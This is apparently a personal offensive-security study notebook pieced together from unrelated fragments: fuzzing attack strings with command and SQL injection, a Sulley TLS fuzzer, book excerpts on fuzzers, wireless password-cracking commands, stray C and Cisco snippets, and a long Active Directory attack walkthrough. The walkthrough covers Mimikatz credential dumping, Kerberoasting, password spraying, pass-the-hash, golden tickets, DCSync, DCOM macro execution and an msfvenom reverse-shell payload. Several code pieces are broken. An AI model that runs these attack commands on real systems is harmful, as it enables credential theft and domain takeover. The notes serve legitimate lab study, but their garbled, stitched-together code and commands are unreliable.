“..:..:..:..:..:..:..:..:..:..:..:..:..:”,
“\\\\*”,
“\\\\?\\”,
“/\\” * 5000,
“/.” * 5000,
“!@#$%%^#$%#$@#$%$$@#$%^^**(()”,
“%01%02%03%04%0a%0d%0aADSF”,
“%01%02%03@%04%0a%0d%0aADSF”,
“/%00/”,
“%00/”,
“%00”,
“%u0000”,
# format strings.
“%n” * 100,
“%n” * 500,
“\”%n\”” * 500,
“%s” * 100,
“%s” * 500,
“\”%s\”” * 500,

# command injection.
“|touch /tmp/SULLEY”,
“;touch /tmp/SULLEY;”,
“|notepad”,
“;notepad;”,
“\nnotepad\n”,
# SQL injection.
“1;SELECT%20*”,
“’sqlattempt1”,
“(sqlattempt2)”,
“OR%201=1”,
# some binary strings.
“\xde\xad\xbe\xef”,
“\xde\xad\xbe\xef” * 10,
“\xde\xad\xbe\xef” * 100,
“\xde\xad\xbe\xef” * 1000,
“\xde\xad\xbe\xef” * 10000,
“\x00” * 1000, 



------------------------------------------------------------
DetectCycle
--------------
#include<ListNode.h>
struct ListNode *detectCycle(struct ListNode *head)
{
struct ListNode *fast=head,*slow=head;
int hasCycle=0;
while(fast != NULL && fast->next != NULL)
{
slow = slow->next;
fast = fast->next->next;
if(fast == slow)
{
hasCycle =1;
break;

}
}
if(hasCycle == 1)
{
for(slow = head;slow != fast; slow=slow->next, fast = fast->next)
;
return fast;

}
return NULL;
}
------------------------------------------------------------------------
Linked List 
-----------------
#include <stdio.h>
#include <stdlib.h>

struct node 
{
int a;
struct node *next 

};

void generate(struct node **);
void display(struct node **);
void delete(struct node **);

int main()
{
struct node *head = NULL;

generate(&head);
printf("\nDisplaying the alternate words");
display(head);
delete(&head);
return 0;

}

void display(struct node *head)
{
int flag = 0;
while(head != NULL)
{
if(!flag % 2)
{
printf("%d",head->a);

}
flag++;
head = head->next;

}
}

void generate(struct node **head)
{
int num,i;
struct node *temp;
printf("Enter the length");

 scanf("%d", &num);
    for (i = num; i > 0; i--)
    {
        temp = (struct node *)malloc(sizeof(struct node));
        temp->a = i;
        if (*head == NULL)
        {
            *head = temp;
            (*head)->next = NULL;
        }
        else
        {
            temp->next = *head;
            *head = temp;
        }
    }
}
 
void delete(struct node **head)
{
    struct node *temp;
    while (*head != NULL)
    {
        temp = *head;
        *head = (*head)->next;
        free(temp);
    }
}}

-------------------------------------------------------------------
perl –e “print ‘user ‘.’a’x1000.’\r\n’” | nc localhost 4000


Sulley framework 
-----------------------

from sulley import *
from sulley import tls 
sess = sessions.session(session_filename="aduits/tls/tls.session",sleep_time = .25,log_level = 10)
target = sessions.target("192.168.141.12",443);
target.netmon = pedrpc.client("192.168.141.12", 26001)
sess.add_target(target)

sess.connect(s_get("client_hello"))
sess.connect(s_get("client_key_exchange_change_cipher_finish"))
sess.fuzz()
------------------------------------------------------------------
from sulley import *
s_initialize("client_hello")
s_random("\x16",1,1,name="content_type")
s_random("\x03\x01",2,2)
s_size("handshake",length=2,fuzzable=True, endian='>')
if s_block_start("handshake"):
s_random("\x01",1,1,name = "handshake_type")
s_size("handshake_client_hello",length=3,fuzzable = True,endian = '>')
if s_block_start("handshake_client_hello");
s_random("\x03\x01",2,2)
s_random("\x00\x00\x56\x03",4,4,name="time")
s_static("A" * 28, name= "random_data")
s_random("\x00",1,1,name="session_id_len")
s_size("cipher_suites",length=2,fuzzable=True,endian='>')
if s_block_start("cipher_suites"):
s_static("\x00\x39")
s_static("\x00\x38")
s_static("\x00\x35")
s_static("\x00\x33")
s_static("\x00\x32")
s_static("\x00\x39")
s_static("\x00\x04")
s_static("\x00\x05")
s_static("\x00\x2f")
s_static("\x00\x16")
s_static("\x00\x13")
s_static("\x00\xff")
s_static("\x00\x0a")
s_string("\x00\x00")
s_string("alot")
s_block_end("cipher_suites")

s_size("compression",length=1,fuzzable=True)
if s_block_start("compression")
s_string("\x00")
s_block_end()

s_size("extensions",length=2,endian='>',fuzzable=True)
if s_block_start("extensions")
if s_block_start("extension_block"):
s_random("\x00\x0a",2,2,name="extension_type")
s_size("extension_data",length=2,endian='>')
if s_block_start("extension_data"):
s_random("\x00\x06\x00\x17\x00\x18\x00\x19")
s_block_end("extension_data")
s_block_end("extension_block")
s_repeat("extension_block",min_reps=0,max_reps=600,step=50)
s_block_end(extensions)
s_block_end("handshake_client_hello")
s_block_end("handshake")
------------------------------------------------------------------
DHCP Client 

---------------------

sh ip int brief 

conf t
int f0/0
ip address 10.1.1.2 255.255.0

no shut 
exit
ip dhcp pool clients 
network 10.1.1.0 255.255.255.0
 default-router  10.1.1.2
 
dns-server 10.1.1.2 
lease 
#to know how long 
option 150 
#dhcp option code

ip dhcp excluded-address  10.1.1.1 10.1.1.10
end
sh run 
sh ip dhcp pool
ip dhcp binding
 
show debug 
debug ip dhcp server packet 
#using DHCP Dixcover method
end 
sh run 
show ip dhcp binding 



go to the client 
-----------------
mac-address aaaa.bbbb.cccc
ip address dhcp 
no shut 
end 
sh ip int brief 
sh ip route
conf t 
int f0/0
 shut
 ip dhcp client-id   ascii PC2
 no shut 
 sh dhcp lease 
  no shut 
  
 
 spanning-tree inconsistentports
 spanning-tree summary 
 no spanning-tree portfast
 spanning-tree blockedports 
 sh spanning-tree
 spanning-tree bpduguard enable 
 sh run | i bpdu 
 
 

David Bombal Discord 
https://discord.com/invite/usKSyzb

sysctl -w net.ipv4.ip_forward=1
----------------------------------------------------------------------------------
XEP  0065  SOCKS5 ByteStream 
XEP 0163 Personal Eventing protocol 
XEP 0191 Blocking command 
XEP 0198 Stream Management
XEP 0280 Message Carbons
XEP 0237 Roster Versioning 
XEP 0313 Message Archive Management
XEP 0352 Client State Indication 
XEP 0363 HTTP File Upload 

--------------------------------------------------------------------------------------------------------
COWPATTY 
-----------
install 
...
wget http://www.wirelessdefence.org/Contents/Files/cowpatty-4.6.tgz
$ tar zxfv cowpatty-4.6.tgz
$ cd cowpatty-4.6
$ make cowpatty
$ sudo cp cowpatty /usr/bin

Usage  ....
$ cowpatty -h
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Usage: cowpatty [options]

   -f Dictionary file
   -d Hash file (genpmk)
capture file
   -s Netwo   -r Packet rk SSID (enclose in quotes if SSID includes spaces)
   -c Check for valid 4-way frames, does not crack
   -h Print this help information and exit
   -v Print verbose information (more -v for more verbosity)
   -V Print program version and exit  
   
   
   
   
   genpmk 
   ...
   $ genpmk -h
genpmk 1.3 - WPA-PSK precomputation attack. jwright@hasborg.com
Usage: genpmk [options]

   -f Dictionary file
   -d Output hash file
   -s Network SSID
   -h Print this help information and exit
   -v Print verbose information (more -v for more verbosity)
   -V Print program version and exit 

 After precomputing the hash file, run cowpatty with the -d argument. 
 
 
 
 
 Cracking the Hash 
  cowpatty -f /pentest/passwords/wordlists/[WORDLIST.TXT] -r [PACKET_CAPTURE_FILE.CAP] -s [SSID]
  
  Cracking the password 
  $ cowpatty -d [HASH_FILE] -r [PACKET_CAPTURE_FILE] -s [SSID] 
  
  
  
  WEP Attacks
  -------------
  
  airodump-ng wlan0
  airodump-ng --bssid <MAC ADDRESS> --channel 11 --write wep wlan0
  aircrack-ng wep-02.cap
  
  
  --------------------------------------------------------------------------------
  fuzzing continuation 
  ----------------------------
  Intelligent fuzzing 
  -----------------------
  [Client]-> “us<50000 \xff’s>er jaed\r\n”
-------------------loop 1--------------
[Client]-> “user ja<12 %n’s>red\r\n”
 “user Ok. Provide pass.\r\n” <-[Server]
[Client]-> “\x34\x56\x12\x...\r\n”
-------------------loop 2--------------
[Client]-> “user ja<1342 \x00’s>red\r\n”
-------------------loop 3--------------
[Client]-> “user jared\r\n”
 “user Ok. Provide pass.\r\n” <-[Server]
6760 Book.indb 142 12/22/17 10:50 AM
5.1 Fuzzing Methods 143
[Client]-> “\x04\x98\xbb\x...\r\n”
-------------------loop 4------------

other  fuzzing   frameworks

------------------
5.2.3.1 ikefuzz
For a simple example of a home-grown protocol-specific fuzzer, consider ikefuzz.21
This tool was created a few years ago to test the ISAKMP protocol. The primary
reason for this is because IKE is loaded with cryptographic routines. This fuzzer
will test this specific protocol, but nothing else.
5.2.3.2 FTPfuzz
FTPfuzz22 is a protocol-specific fuzzer that is designed to fuzz FTP servers. It
understands the protocol and can actively talk to FTP servers and determine which
commands it accepts. It is managed by a Windows GUI application, which makes
it particularly friendly to use. Furthermore, the heuristics used can be selected by
the user from within the GUI interface.
5.2.4 Generic Fuzzers
A generic fuzzer is one that can be utilized to test multiple interfaces or applications. For example, a file fuzzer that flips bits in any file type might be thought of
as generic, since it can flip bits in arbitrary file types to be consumed by a variety
of applications. However, such a fuzzer would be nonintelligent because it blindly
makes changes with no knowledge of the underlying files structure. A file fuzzer
might still be generic and receive as an initialization parameter a partial or full
description of the file type to be fuzzed; this would increase its intelligence. The file
fuzzer would be a one-off or protocol-specific tool if it can only fuzz files of one type.
5.2.4.1 ProxyFuzz
An example of a generic fuzzer is ProxyFuzz.23 This fuzzer, written in Python, acts
as a man in the middle proxy and randomly makes changes to packets as they pass
through it. It doesn’t understand anything about the underlying protocol, it is completely unintelligent. It can be used to fuzz the server side of the communication, the
client side, or both. It can also handle either TCP or UDP data. The advantage of
using a simple fuzzer like ProxyFuzz is that it can be set up in a matter of minutes
and can find bugs. Obviously, it will not perform well against protocols that utilize
checksums, encryption, or challenge responses. The command line usage statement
reveals exactly how simple this fuzzer actual is. It looks like
python proxyfuzz -l <localport> -r <remotehost> -p <remoteport> [options]
[options]
-c: Fuzz only client side (both otherwise)
-s: Fuzz only server side (both otherwise)
-w: Number of requests to send before start fuzzing




5.2.4.2 FileFuzz
FileFuzz24 is a graphical Windows-based fuzzer written by Michael Sutton when
he worked for iDefense Labs. The GUI allows for the creation of fuzzed files and
a way to execute and monitor the application. During the creation phase, portions
of the initial valid file can be provided and the types of changes to those bytes can
be specified. For example, all bytes, one group at a time, in a file can quickly be
replaced with the value 0xFF. Then, these files are launched in a specified application
as the command line argument. Additionally, FileFuzz comes with a monitoring tool
called crashme.exe. When FileFuzz actually launches the application, it launches it
by first calling crashme, which attaches to the target as a debugger and monitors it
for faults. The GUI displays the progress as each fuzzed file is launched, recording
any crashes that it discovers. A newer version of a tool like this has been created
by Microsoft: miniFuzz.25
5.2.5 Capture-Replay
Most mutation or capture-replay fuzzers are generic. They operate by obtaining a
known good communication (a file, network sniff, typical arguments to a function,
etc), modifying it, and repeatedly delivering it to the target. The goal is to quickly
fuzz a new or unknown protocol; the capture provides a sort of partial interface
definition. One good thing about this approach is that if the protocol doesn’t operate in a manner consistent with the RFC, it is not a problem for mutation based
fuzzers since they don’t understand the RFC. If the capture includes this undocumented capability, a mutation-based fuzzer will fuzz it, while a generation-based
fuzzer might miss the undocumented feature since it is built from the specification.
As in generic fuzzers, many mutation fuzzers can be tuned to a particular protocol,
increasing its protocol awareness and consequent code coverage. Mutation fuzzers
that record results during run-time will mature the testing process.
5.2.5.1 Autodafé
One generic capture-replay tool is known as Autodafé. Autodafé employs grey-box
techniques. The tool was created by Martin Vuagnoux26 and can be downloaded
from http://autodafe.sourceforge.net/. Helpful tutorials can also be found at this
URL. Autodafé includes automatic protocol detection with manual updating available, a large list of attack strings, and an incorporated debugger to dynamically place
weights on areas of target code that utilize external data in dangerous functions. 

Multiplying the number of attack strings by the number of variables to fuzz yields the
complexity. By minimizing and ordering the tests, the overall runtime is decreased.
In the fuzzing field, Vuagnoux is probably the first to calculate such a metric, even
though it is relatively simple. There is an excellent tutorial online at http://autodafe.
sourceforge.net/tutorial/index.html, which we highly recommend you examine if
you’re considering fuzzing Unix applications.
5.2.5.2 The Art of Fuzzing
The Art of Fuzzing (TAOF27) is a fuzzer that builds upon the work of many others.
This tool operates by capturing a proxied session and replaying with mutated traffic. TAOF is a GUI cross-platform Python generic network protocol fuzzer. It has
been designed for minimizing setup time during fuzzing sessions, and it is especially
useful for fast testing of proprietary or undocumented protocols.28, 27 Here are some
self-explanatory screen shots from the Website (Figures 5.4 to 5.8):
TAOF allows the user to decompose the captured packets according to the protocol specification. In this way TAOF can more intelligently add anomalies to the
captured exchange and hopefully find more bugs.
5.2.5.3 Ioctlizer
Ioctlizer29 is a two-part tool, written by Justin Seitz, which learns how a user mode
process utilizes IOCTLs to communicate with device drivers. From the test cases
that are trapped, it will fuzz the actual device. As a quick overview, an IOCTL (pronounced i-oc-tel), is part of the user-to-kernel interface of a conventional operating
system. Short for input/output control, IOCTLs are typically employed to allow
user space code to communicate with hardware devices through kernel drivers.
Ioctlizer is a generic IOCTL mutation (capture-replay) tool. As such, it suffers and excels in the same way that all capture-replay tools do. This is also an
example of a one-off, because it was a quick tool designed only to fuzz IOCTLs.
Mr. Seitz created a more advanced tool that will enumerate all of the IOCTLs IDs
via an Immunity Debugger plug-in. Figures 5.9 to 5.14 show an example of how
one might use this tool:
In this case, the Windows calculator application (calc.exe) did not access an
IOCTL. The wireshark program did, but no errors were found. This is likely due
to three things:
1. There are no bugs to be found (probably not the case here).
2. Ten iterations were not enough to find the bug.
3. Wireshark did not access all possible IOCTLs in the limited amount of time
observed (most likely).
Thus, we see the primary weakness of mutation based systems in action here.

5.2.5.4 The General Purpose Fuzzer
Another open-source generic mutation tool for download is called the General
Purpose Fuzzer (GPF) written by Jared DeMott. The typical use is performed in
the following manner:
1. Capture the network traffic to be fuzzed.
a. Be sure to save only the traffic you want by using an ethereal or wireshark filter.
b. Typically, this capture will be converted from the pcap format to the .gpf
format via a command like: ./GPF –C imap.cap imap.gpf
c. Optionally, a .gpf “capture” file can easily be defined by hand. For example, the file prelogin.gpf in the directory /GPF/bin/imap was created
entirely by hand and was useful for finding (prelogin imap) bugs. The
file looks like:
Source:S Size:0021 Data:* OK Dovecot ready.
Source:C Size:0020 Data:02 LOGIN jared {5}
Source:S Size:0005 Data:02
Source:C Size:0007 Data:jared
Source:S Size:0005 Data:02
Source:C Size:0015 Data:03 CAPABILITY
Source:S Size:0005 Data:02
Source:C Size:0023 Data:04 AUTHENTICATE PLAIN
Source:S Size:0004 Data:+
Source:C Size:0026 Data:amFykjdAamFyZWQAamFyZWQ=
Source:S Size:0018 Data:04 OK Logged in.
Source:C Size:0030 Data:05 NOOP
04 LOGIN jared jared
Source:S Size:0005 Data:05
Source:C Size:0022 Data:06 LOGIN jared jared
Source:S Size:0005 Data:06
Source:C Size:0013 Data:07 STARTTLS
Source:S Size:0005 Data:07
Source:C Size:0011 Data:08 LOGOUT
The Source indicates which direction this communication originated
from—S is server and C is client. At fuzz time these can easily be flipped by
running GPF in the opposite mode than the capture was originally made.
It will then send “02 LOGIN jared {5},” and so on. The Size indicates the
amount of data. This allows for binary data to also be easily represented
in a .gpf file. Everything of Size length following the Data tag is the data
for this leg. A leg is one read or write communication of an entire session.
2. Choose an attack type.
a. The –R simply sends random data to an IP/PORT. This is only good
for fuzzing the first layer of a protocol. It’s very naive/dumb, but has
found bugs.
6760 Book.indb 159 12/22/17 10:50 AM
160 Building and Classifying Fuzzers
b. The original GPF mode has four submodes: replay, buffer overflow, format, and logic. Replay will simply replay the capture. This is useful for
demonstrating an already discovered bug, or for validating a capture. The
buffer overflow submode inserts long strings at places of your choosing,
and the format attack mode inserts format string characters (such as %n)
in a similar manner. The logic mode is focused on bit flipping
c. The –P or pattern matching mode is the most popular GPF mode. It
automates the best of the above attack types. Each time the capture is
replayed, attacks of all types are inserted in random positions based on
the token type. Also, and very effectively, a reordering of the capture
file can occur. The –P command line requires us to supply a tokenizing
routine that helps GPF break up the capture file. In this case IMAP is
a normal_ascii protocol. Consider the execution of GPF against IMAP:
../GPF -P prelogin.gpf client 192.168.31.101 143 ? TCP 11223456
10000 2 auto none short normal_ascii quit
Before GPF begins fuzzing, the tokenizing output will look something
like this:
Tokenizing Captured Protocol:
Tok[1][0]: type= ASCII_CMD, dataLen=2,
currentTotal=2, data=”02”
Tok[1][1]: type= ASCII_SPACE, dataLen=1,
currentTotal=3, data=” “
Tok[1][2]: type= ASCII_CMDVAR, dataLen=5,
currentTotal=8, data=”LOGIN”
Tok[1][3]: type= ASCII_SPACE, dataLen=1,
currentTotal=9, data=” “
Tok[1][4]: type= ASCII_CMDVAR, dataLen=5,
currentTotal=14, data=”jared”
Tok[1][5]: type= ASCII_SPACE, dataLen=1,
currentTotal=15, data=” “
Tok[1][6]: type= ASCII_CMDVAR, dataLen=3,
currentTotal=18, data=”{5}”
Tok[1][7]: type= ASCII_END, dataLen=2,
currentTotal=20, data=”\x0d\x0a”
Tok[3][0]: type= ASCII_CMD, dataLen=5,
currentTotal=5, data=”jared”
Tok[3][1]: type= ASCII_END, dataLen=2,
currentTotal=7, data=”\x0d\x0a”
Tok[5][0]: type= ASCII_CMD, dataLen=2,
currentTotal=2, data=”03”
Tok[5][1]: type= ASCII_SPACE, dataLen=1,
currentTotal=3, data=” “
Tok[5][2]: type= ASCII_CMDVAR, dataLen=10,
currentTotal=13, data=”CAPABILITY”
Tok[5][3]: type= ASCII_END, dataLen=2,
currentTotal=15, data=”\x0d\x0a”
6760 Book.indb 160 12/22/17 10:50 AM
5.2 Detailed View of Fuzzer Types 161
Each piece of data, now called a token, is assigned a type. Note that GPF
didn’t attempt to tokenize the server data, because this will simply be read
in by GPF and generally not acted upon. Each token is fuzzed according to
its own heuristics. For example, an ASCII_END might be reordered (\x0a\
x0d), replaced by a null, or left off. ASCII_CMDs aren’t fuzzed as often
because parsing mistakes tend to be in CMDVARs. See the GPF source code
for a complete description of the many heuristics.


--------------------------------------------------------------------------------------------

Files
------------
import java.io.*;
import java.security.SecureRandom;
import java.util.Random;

public class Fuzzer{
private Random random = new SecureRandom();
private int count = 1;


public File fuzz(File in, int start, int length) throws IOException 
{
byte[] data = new byte[(int) in.length()];
DataInputStream din = new DataInputStream(new FileInputStream(in));
din.readFully(data);
fuzz(data,start,length);
string name = "fuzz_" + count + "_"  +in.getName();
File fout = new File(name);
FileOutputStream out  =  new FileInputStream(fout);
out.write(data);
out.close();
din.close();
count++;
return fout;

}

public void fuzz(byte[] in, int start, int length)
{
byte[] fuzz = new byte[length];
random.nextBytes(fuzz);
System.arraycopy(fuzz,0,in,start,fuzz.length);

}
}
--------------
As described earlier, many file fuzzers exist, including Surku, FileFuzz, SPIKEfile, notSPIKEfile, and the file fuzz PaiMei module.

-----------------------------------------------------------------------------------
APIS
--------

5.3.5 Web Fuzzing
For the most part, Web fuzzing is a misnomer. It certainly is possible to fuzz the
HTTP protocol, just as it is any other protocol. Web testing receives extra attention
because HTTP/HTTPS traffic is the most common internet traffic. Often, though,
when people refer to Web fuzzing, what they really mean is automated Web auditing. This consists of submitting various semi-valid data to various form fields of
Web applications and “spidering” the application to discover all the valid pages,
URLs, and inputs. The open source projects Pantera and Spike Proxy are both
examples of Web application fuzzers. WebInspect, AppScan and OWASP ZAP are
some examples of well-known Web application fuzzers. Web fuzzing may also refer
to audits that brute force various types of login fields.


	 Browsers are terribly complex, including things like JavaScript.
•	 Client-side testing had not been considered important in the past.
•	 H.D. was the first one in. Fuzzing is particularly effective against mostly
untested interfaces. The first to fuzz will find the bulk of bugs. This makes
sense. The same is true for the first round of rough testing done by developers in a traditional setting



OSI (Open Systems Interconnection) is a standard description for how messages
should be transmitted between any two points on a network. Seven layers are used:
•	 Layer 7: Application layer;
•	 Layer 6: Presentation layer;
•	 Layer 5: Session layer;
•	 Layer 4: Transport layer;
•	 Layer 3: Network layer;
•	 Layer 2: Data Link layer;
•	 Layer 1: Physical layer.

--------------------------------------------------------------------------------------------
PWNK
-------------
net User 
net domain 
powershell
create AD-User
net group /domain
net user /domain 
net user /jeff_admin /domain 
NetWkstaUserEnum - users logged into a target workstation 
NetSessionEnum - regular users list 
powershell empire framework 
import powershell from active driectory 
using Import-Module ./PowerView.ps1
Get-NetLoggedon -ComputerName client251
check from DC01
check for DC01 they originate from a specific workstation
Get-NetSession -ComputerName dc01 - will return all active sessions 
Local System 
Local service 
Network Service 
application like exchange and sql 

Serive Principal Name (SPN) - used to ascc the service on a server
enumerate all registered SPN 
reducing the need for a board port scan 
 check the powershell enumerate.ps1 script
 filter them for attribute of account name IIS service 
 and find spn 
 nslookup CorpWebServer.corp.com 
 Active Directory authentication 
 uses either kerberos or NTLM Authentication protocols 
 for most authentiaction attempts 
 NTML 
 client auth to server by ip not hostname 
 if hostname not registered also works 
 third party also uses NTLM
 consistse of 7 steps 
 cryptography hash NTLM Hash
 client send the username to the server 
 which generate the nonce or challenege
 and encrypts the nonce with NTLLM hash now known as response 
 forward the response to domain controller
 it knows all NTLM hash of all users
 then it also hashes(encrypt) from the comparison response
 and validate
 
 challenge and response 
 
 Kerberos 
 ---------
 default protocol 
 for asscc services 
 2003
 Ticket System 
 dc is the key distribution center
 kdc
 6 steps
 request to dc(kdc)
 maintain the auth 
 with it 
 server also has a timestamp hashed from the pass(derived hash) 
 (request)
 when dc recieved
  check for the hash 
  and decrypt the hash timestamp 
  it lookup the pass hash and try to decrypt the timestamp 
  and if success and its not duplicated 
  then success
  auth reply with session key 
  kerberos is stateless
  and ticket granting ticket (all info about the user)
  session key is now decrypted using the users passwd now
  and maybe decrypted and reuse by the client 
  tgt is encrypted using secret key know only to kdc 
  and cannot be decrypted by the client 
  auth is complete when client is handed with the tgt and session key 
  user wish the resources  with the reg service principal name
  it must again contact the kdc
  this time  ticket granting service request packet(current user and the timestamp ) encrypted using the 
  session key ,SPN of the resource and the encrypted tgt 
   tgt service  on the kdc recieve the requests
   and if the spn exist in the domain 
   tgt is decrypted usign the secret key known only to the kdc
   sess key is extracted and will now know the username and timestamp 
   of the rquest 
   several check 
   if succeed 
   then respond with the ticket granting server reply 
   packet contains three parts 
   spn 
   sess key 
   they are encrypted using the sess key associated with the ticket granting ticket 
   service ticket (username , grp member , newly created session key ) 
   encrypted using the passwd hash  of the service acc with the spn 
   if complete  and client conatins both the service ticket  and session key 
   the service auth begins 
   clients send the app request 
   to the app server  with 
   username timestamp  encrypted with a session key 
   assc with the service ticket  along with the service ticket itself 
   app server decrypts the service ticket  using the service account passwd hash 
   and extract the username and the session key 
   and the uses the service key to decrypt the username from the application request 
   if it matches the one decrypted from the service ticket 
   then  request is accepted
    is also checks supply group membership 
	and assign appropriate permisssion 
	after which the user accepts some services from the app server
	
	
   Passwd Hashes 
   -----------------
   SSO  -  impl of microsoft for kerberos 
   so it must be stored 
   inorder  to renew tgt request
   in current version 
   these hashes are stored in the Local Security Authority SubSystem Service(LSASS)
   memory space 
   need to get hold with it  to hack kerberos 
   this is the end goal 
   need to get into LSASS
   we need system or local admin access for these hashes as these are stored in system account 
   we need privilege escalation (local)
   data structures used to store the hash in the  memory is not documented anywhere
   and there also encrypted using lsass stored key 
   Mimikatz to EXTRACT hashes in the windows system 
   cmd run as admin 
   lets run mimkatz.exe
   privilege::debug
   dump using the command 
   sekurlsa::logonpasswords
   2003 NTML is the only hash 
   for 2008 or later both ntlm and sha -1 will be available 
   sekurlsa::tickets
   
   service Account Attacks 
   -------------------------
    Add-type -AssemblyName System.IdentityModel 
	New-Object System .IdentityModel.Tokens.kerberosRequestSecurityToken -ArgumentList- 'HTTP/CorpWebServer.corp.com '
	 u can also use klist instead of mimkatz
	 kerberos::list /export 
	 service ticket is encrypted using spn service hash 
     lets transfer the file to the kali machine 
	 using ftp 
	 bin 
	 we transfer the file by saying "put " command 
	 put 'spn ' service principal name
	 sudo apt update && sudo apt install kerberoast 
	 clear 
	 run tgsrepcrack.py with the wordlist 
	 and the downloaded service ticket 
	 and hola !
	 its cracked
	 
	 
	 Low and Slow Password guessing 
	 ---------------------------------
	 net accounts
	  run our enumerateADPassowrd scripts 
	  and the object creation is done 
	  locate sprayPasswords.ps1 
	  and run 
	  .\Spraypasswords.ps1 -Pass Qwerty09! -Admin 
	  
   
   Get a rDesktop in Linux/Unix 
   --------------------------------
   rdesktop 10.11.0.22 -u Offsec@corp -p Qwerty1092 -g 1024x768 -x 0x80 
   
   ---------------------------------------------------
   
   Active directory lateral Movement 
   -----------------------------------
 kerberos and NTLM never uses cleratext passwd directly
 
 Pass the Hash 
 ------------------
 using NTLM Hash instead a plain text passwd 
 not kerberos only NTLM 
 third party and framework 
 only use this technique 
 psexact from metasploit 
 and the passing the hash toolkit 
 smb block and perform auth using ntlm hash 
 pth uses ntlm hash legitimately 
 pthwin.exe 
 passing the hash toolkit
 ipconfig
 
 
 
 Overpass the hash 
 -------------------
 right click notpad 
 shoft right click the notepad menu from there 
 and select run as administrator
 sekurlsa::logonpasswords
 simple way 
 pth command from mimikatz 
 with /user/domain 
 ntlm hash 
 with /run:Powershell.exe
 sekurlsa::pth /user/jeff_admin /domain::corp.com /ntlm:{ur hash} /run::Powershell.exe
 check klist to confirm 
 net use \\dc01
 klist 
 this enabled us to convert ntlm hash to kerberos 
 .\PsExec.exe \\dc01 cmd.exe
 whoami
 ipconfig
 
 
 Pass the Ticket 
 -----------------
 application server blindly trusy the user credential
 
 security identifier 
 for kerberos ticket misleading 
 find sid 
 by whoami /user command 
 
 domain is the entire string except the last 4 digits
 
  flush kerberos 
  by kerberos::purge
  and verify by kerberos::list 
  
  kerberos::golden /user:offsec /domain:corp.com /sid:  /target:
  fully qualified host name /service:HTTP hash /rc4: 
  and atlast inject to memory using  
  /ptt
  
  kerberos::list 
  
  
  
  
  Ditributed Component Object Model
  ---------------------------------
    
  powershell.exe
   
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.178.1.110"))
  
   create instance of the system activator class
    $com  | Get-Member
	will focus on the run method 
	which allow us to run the visual basic macro on it 
	
	create an excel document 
	and create macro in it 
	
	
	 that launches notepad.exe
	 
	 Sub mymacro()
	 shell("notepad.exe")
	 End Sub
	 
	 save it in a xls format 
	 
	 run exceldcom.ps1
	 
	
     use the Workbook method to Open ur ExcelFile 
	 $workbook  = $com.Workbook.Open("C:\myExcel.xls")
	 
 

 
unable to open output 
bcoz its done with the system accounts 

its instantiated with dcom 



to fix this problem 
$Path = "${IP}:\Windows\SysWOW64\config\systemprofile"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")


  workbooks are for the profile folder 
   
   
   now execute exceldcom.ps1
   
   






check the program processes using the c:\Tools\sysinternalssuite\procexp.exe

lets make a reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT 4444
-f hta-psh -o evil.hta

it will create a payload for reverse shell



use a python script to split the command into smaller chunks 
use leafpad 
on Kali 
 and execute py script
 and get the splitted chunks 
 and paste it into macros 
 as a string 
 
 
 
 now start a netcat listener on the windows 10 like this 
 
 nc.exe -lnvp 4444
 
 yoh got the shell
 ----------------------------------------------------------
 
 Active Directory Persistance 
 ---------------------------------
 we need persistance to stay in the terminal for access
 kerberos auth 
 kdc encrypts the tgt with a secret key known only to kdc 
 it is the passwd hash of the domain user account called
 "krbtgt"
 
 
 before in getting hold 
  we need to create our own self-made tgt 
  or golden ticket 
  we could create a tgt 
  stating that a non priveleged user is actually a member of the  domain admins
  group and the domain controller will trust it since it is encrypted correctly
  krbtgt is not automatically changed 
  so that we can easily find easy old krbtgt passwd hashes 
  
  to test 
  
  
  login as offsec user 
  
  cmd - run as administrator
   laterally move via psexec.exe \\dc01 cmd.exe
   
   
   go to jeff admin account 
   domain controller valid account 
     go to c:\Tools folder 
	 mimikatz
	 privilege::debug 
	 lsadump::lsa /patch 
	 take the NTLM Hash of any account 
	 
	 
	 
	 after in compromised workstation 
	 mimikatz
	 privilege::debug
	 kerberos::purge 
	 kerberos::golden /user:fakeuser /domain:corp.com /sid: sid using whoami 
	 /krbtgt:{hash}
	 //to indicate we are supplying the passwd hash 
	 //set the username to fakeuser
	 /ptt
   
   mimkatz provide u with userid and groupid 
   userid -> 500 is the default r id of the builtin admin for the domain 
   groupid  most priveleged groups 
   including the domain  admins group 
   
   
   with the golden ticket imported into memory we can execute 
   
   misc::cmd 
   and then again lateral mocement 
   psexec.exe \\dc01 cmd.exe
   we get a interactive cmd prompr
   whoami 
   gets u the name fakeuser
    whoami /groups 
	show we are a member of a multiple powerful domain admins groups 
	
	if we use the ip address of the domain controller instead of the hostname 
	we are shown an output 
	access is denied 
	 it forces the use of NTLM Authentication 
	 and access will still be blocked 
	 
	 
	 
	 Domain Controller Synchronization 
	 -----------------------------------
	 steal the passwd hashes
	 several ways to do this 
	  we can also steal a copy of the NTDS.dit
	  database file 
	  it is copy of all  AD Account stored on the hard drive 
	   in production 
	   domain consist of several domain controllers for redundancy 
	   by the way they use replication of directory 
	   to synchronizes the domain controller 
	  

Domain controller may request an update  for a specific objects 
	like an account with an specific API 
	   it only checks the asc sid have the correct priveleges
	   if we try to issue a rogue  request   to a domain controller 
	   from a user who is a member of the domain controller admins group 
	   it will 'Succeed'

	   
	   
	   
	   cd cd :\Tools\active_directory
	   mimikatz
	   lsadump::dcsync /user:Administrator
	   to sync target user 
	   the dump will contain multiple hashes 
	   last used hashes (dumped)
	   as well as hashed used with AES Encryption 
	   
	   
	   
	   this way we can request a passwd hash of the admin using the replication request 
	   and get acquired 
 	EXIT 
	
	   
	  
	
	
	
	project 1
	--------------
	make backup for etc/hosts
	update etc/hosts
	dirb 
	wordpress 
	wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o sandbox-wpscan -f cli-no-color
	less sandbox-wpscan 
	results include 
	elementor 
	ocean-extra
	wp-survey and poll 
	searchsploit elementor 
	ocean-extra
	and wp-survey-and-poll
	searchsploit survey poll 
	give us the desired result 
	check the exploit 
	with less
	and its path 
	
	
	
	Burpsuite 
	intercept traffic 
	after forwarding traffic from the captured block in proxyfuzzu get cookie mentioned in the vulneranility report 
	Cookie: wp_sap
	
	
	
	SQL Injection exploitation 
	-------------------------------
	take the payload from the original exploit 
	exploit here is 
	in the screenshot 
